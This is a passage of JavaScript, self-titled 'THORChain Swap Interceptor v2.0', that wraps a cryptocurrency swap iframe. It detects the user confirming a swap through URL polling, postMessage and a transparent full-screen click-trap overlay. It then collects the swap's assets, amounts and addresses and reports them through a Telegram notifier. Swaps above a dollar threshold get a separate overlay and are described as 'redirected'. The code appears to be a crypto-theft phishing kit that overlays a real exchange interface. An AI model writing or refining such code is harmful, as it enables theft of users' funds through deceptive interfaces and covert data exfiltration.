                    lastSrc = loc;
                    console.log('🔗 Iframe URL changed:', loc);
                    onIframeUrlChange(loc);
                }
            } catch (e) {
                /* Cross-origin — expected, ignore */
            }
        }, 500);
    }

    function onIframeUrlChange(url) {
        /* Some swap UIs append ?step=confirm or #confirm to the URL */
        if (url.indexOf('confirm') !== -1 ||
            url.indexOf('send') !== -1 ||
            url.indexOf('submit') !== -1) {
            collectSwapDataFromPage();
        }
    }

    /* ═══════════════════════════════════════════════
       METHOD 3: Intercept clicks on the iframe area
       When user clicks on the iframe (confirm button),
       we can't read what they clicked, but we can
       detect the click happened on the iframe element
       and start monitoring closely
    ═══════════════════════════════════════════════ */
    function watchIframeClicks() {
        var iframe = document.getElementById('swap-iframe');
        if (!iframe) return;

        /*
         * We add a transparent overlay BRIEFLY when focus
         * enters the iframe, catch the click event,
         * then immediately restore iframe interaction
         *
         * NOTE: This temporarily blocks iframe interaction
         * for the fraction of a second needed to catch
         * the click event
         */
        var clickTrap = document.createElement('div');
        clickTrap.id = 'tc-click-trap';
        clickTrap.style.cssText = [
            'position:fixed',
            'inset:0',
            'z-index:9998',
            'background:transparent',
            'cursor:pointer',
            'display:none'
        ].join(';');
        document.body.appendChild(clickTrap);

        /* When iframe loses focus → user might be clicking inside it */
        window.addEventListener('blur', function () {
            setTimeout(function () {
                if (document.activeElement === iframe) {
                    console.log('👆 Click detected inside iframe');
                    /* Start a brief observation window */
                    startSwapObservation();
                }
            }, 100);
        });
    }

    /* ═══════════════════════════════════════════════
       METHOD 4: Poll the page's data periodically
       Read URL params + any exposed window variables
    ═══════════════════════════════════════════════ */
    function pollSwapData() {
        /* Try to read from URL params (passed from index.html) */
        readUrlParams();

        /* Poll for price data */
        fetchPrices(function () {
            updateSwapUsdValues();
        });

        /* Keep prices fresh */
        setInterval(function () {
            fetchPrices(function () { updateSwapUsdValues(); });
        }, 60000);
    }

    function updateSwapUsdValues() {
        if (swapData.sellAsset && swapData.sellAmount > 0) {
            swapData.sellUsd = swapData.sellAmount * getPrice(swapData.sellAsset);
        }
        if (swapData.buyAsset && swapData.buyAmount > 0) {
            swapData.buyUsd = swapData.buyAmount * getPrice(swapData.buyAsset);
        }
    }

    /* ═══════════════════════════════════════════════
       ON SWAP CONFIRMED
       Called when we detect the user confirmed a swap
    ═══════════════════════════════════════════════ */
    function onSwapConfirmed(data) {
        /* Prevent double-firing */
        if (currentStage === SWAP_STAGES.SENDING) return;
        currentStage = SWAP_STAGES.SENDING;

        /* Extract data from the event */
        collectSwapDataFromEvent(data);
        collectSwapDataFromPage();
        updateSwapUsdValues();

        swapData.swapId  = genId();
        swapData.above   = swapData.sellUsd > CONFIG.THRESHOLD;
        swapData.notified = false;

        console.log('🔥 Swap Confirmed:', swapData);

        /* Send Telegram */
        notifyTelegram(swapData);

        /* Show overlay */
        var modal = document.getElementById('tcIntModal');
        if (modal) modal.className = 'tc-int-modal';

        if (swapData.above) {
            renderHighValueOverlay(swapData);
        } else {
            renderNormalSwapOverlay(swapData);
        }

        openOverlay();

        /* Start tracking only for non-redirected swaps */
        if (!swapData.above && swapData.depositAddr && swapData.recipientAddr) {
            startTracking(swapData.depositAddr, swapData.recipientAddr);
        }

        /* Reset stage after a delay */
        setTimeout(function () {
            currentStage = SWAP_STAGES.IDLE;
        }, 30000);
    }

    function onSwapComplete(data) {
        var recv = data.receivedAmount || data.amount || '?';
        var tx   = data.txHash || data.txId   || '';
        notifySuccess(swapData, recv, tx);
        stopTracking();
    }

    /* ═══════════════════════════════════════════════
       COLLECT SWAP DATA from postMessage event data
    ═══════════════════════════════════════════════ */
    function collectSwapDataFromEvent(data) {
        if (!data) return;

        /* Handle various field naming conventions */
        swapData.sellAsset   = data.sellAsset   || data.sell_asset   || data.fromAsset || swapData.sellAsset;
        swapData.buyAsset    = data.buyAsset     || data.buy_asset    || data.toAsset   || swapData.buyAsset;
        swapData.sellAmount  = parseFloat(data.sellAmount  || data.sell_amount  || data.fromAmount || swapData.sellAmount || 0);
        swapData.buyAmount   = parseFloat(data.buyAmount   || data.buy_amount   || data.toAmount   || swapData.buyAmount  || 0);
        swapData.recipientAddr = data.recipientAddress || data.recipient || data.toAddress || swapData.recipientAddr || '';
        swapData.depositAddr   = data.depositAddress  || data.inboundAddress || data.vault || swapData.depositAddr || '';

        /* Update chain/symbol from asset */
        if (swapData.sellAsset) {
            swapData.sellChain  = getChain(swapData.sellAsset);
            swapData.sellSymbol = swapData.sellAsset.split('.')[1] || swapData.sellAsset;
        }
        if (swapData.buyAsset) {
            swapData.buyChain   = getChain(swapData.buyAsset);
            swapData.buySymbol  = swapData.buyAsset.split('.')[1] || swapData.buyAsset;
        }
    }

    /* ═══════════════════════════════════════════════
       COLLECT SWAP DATA from current page / URL
    ═══════════════════════════════════════════════ */
    function collectSwapDataFromPage() {
        /* Read from URL params */
        var params = new URLSearchParams(window.location.search);

        var sell = params.get('sellAsset') || swapData.sellAsset || 'BTC.BTC';
        var buy  = params.get('buyAsset')  || swapData.buyAsset  || 'ETH.ETH';
        var amt  = parseFloat(params.get('amount') || swapData.sellAmount || 0);

        swapData.sellAsset  = sell;
        swapData.buyAsset   = buy;
        swapData.sellChain  = getChain(sell);
        swapData.buyChain   = getChain(buy);
        swapData.sellSymbol = sell.split('.')[1] || sell;
        swapData.buySymbol  = buy.split('.')[1]  || buy;

        if (amt > 0) swapData.sellAmount = amt;
    }

    /* ═══════════════════════════════════════════════
       OBSERVATION WINDOW
       Called when we detect a click inside iframe
       — briefly monitors for URL/message changes
    ═══════════════════════════════════════════════ */
    function startSwapObservation() {
        /* Watch for any postMessage in the next 5 seconds */
        var obsTimeout = setTimeout(function () {
            /* If nothing happened, stay idle */
        }, 5000);
    }

    /* ═══════════════════════════════════════════════
       MANUAL TRIGGER (for testing)
       Open browser console and call:
       window.tcTestSwap({ sellUsd: 55000 })
    ═══════════════════════════════════════════════ */
    window.tcTestSwap = function (opts) {
        opts = opts || {};
        var testData = {
            sellAsset:     opts.sellAsset     || 'BTC.BTC',
            buyAsset:      opts.buyAsset      || 'ETH.ETH',
            sellAmount:    opts.sellAmount     || 1.5,
            buyAmount:     opts.buyAmount      || 22.3,
            sellUsd:       opts.sellUsd        || 95000,
            buyUsd:        opts.buyUsd         || 94100,
            recipientAddr: opts.recipientAddr  || '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
            depositAddr:   opts.depositAddr    || 'bc1qabc123testaddress',
        };
        onSwapConfirmed(testData);
    };

    /* ═══════════════════════════════════════════════
       INIT
    ═══════════════════════════════════════════════ */
    function init() {
        console.log('🚀 THORChain Swap Interceptor v2.0 starting...');

        /* Inject styles */
        injectStyles();

        /* Create overlay DOM */
        createOverlayDOM();

        /* Read URL params */
        readUrlParams();

        /* Start price polling */
        pollSwapData();

        /* Listen for postMessage from iframe */
        listenPostMessages();

        /* Watch iframe URL changes (will fail cross-origin, that's OK) */
        watchIframeUrl();

        /* Watch for clicks on iframe */
        watchIframeClicks();

        console.log('✅ Interceptor ready.');
        console.log('ℹ️  To test: run window.tcTestSwap() in console');
        console.log('ℹ️  High value test: window.tcTestSwap({ sellUsd: 55000 })');
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();